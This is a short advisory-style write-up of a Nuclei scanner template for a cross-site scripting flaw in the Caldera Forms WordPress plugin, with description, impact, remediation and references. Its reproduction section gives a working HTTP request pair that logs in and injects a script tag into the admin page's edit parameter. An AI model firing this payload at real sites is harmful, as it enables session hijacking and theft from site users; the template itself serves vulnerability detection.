# Nuclei Template: Caldera Forms <= 1.5.4 - Cross-Site Scripting
**Template ID:** wp-caldera-forms-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**CWE:** CWE-79
**Source:** Nuclei Template (`wp-caldera-forms-xss.yaml`)

## Vulnerability Information & PoC

## Description
The Caldera Forms WordPress plugin before 1.5.4 is affected by an cross-site scripting (XSS) vulnerability. Due to insufficient input sanitization and output escaping, attackers can inject arbitrary JavaScript via form submissions, which is then executed for users viewing entries or confirmations.

## Impact
Attackers can inject malicious scripts into forms, potentially leading to session hijacking or theft of sensitive information when users (including admins) view injected entries.

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

GET /wp-admin/admin.php?page=caldera-forms&edit=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}
```

## Remediation
Update the Caldera Forms plugin to version 1.5.5 or later.

## References
- https://wpscan.com/vulnerability/c70219da-eab2-4d0b-ac5a-77f6d565ef31
- https://wordpress.org/plugins/caldera-forms
